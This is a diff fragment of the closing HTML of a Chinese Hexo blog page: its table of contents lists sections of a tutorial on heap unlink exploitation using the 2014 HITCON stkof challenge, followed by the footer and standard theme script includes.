+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Unlink的学习与利用"><span class="nav-number">1.</span> <span class="nav-text">Unlink的学习与利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-unlink是什么"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">0x00 unlink是什么</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-从源代码理解unlink"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">0x01 从源代码理解unlink</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#例题：2014-HITCON-stkof"><span class="nav-number">1.2.</span> <span class="nav-text">例题：2014 HITCON stkof</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-基本信息"><span class="nav-number">1.2.0.1.</span> <span class="nav-text">0x00 基本信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-流程分析"><span class="nav-number">1.2.0.2.</span> <span class="nav-text">0x01 流程分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-利用过程"><span class="nav-number">1.2.0.3.</span> <span class="nav-text">0x02 利用过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-exp"><span class="nav-number">1.2.0.4.</span> <span class="nav-text">0x03 exp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-题外话"><span class="nav-number">1.2.0.5.</span> <span class="nav-text">0x04 题外话</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2017.8.18 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">七夜</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
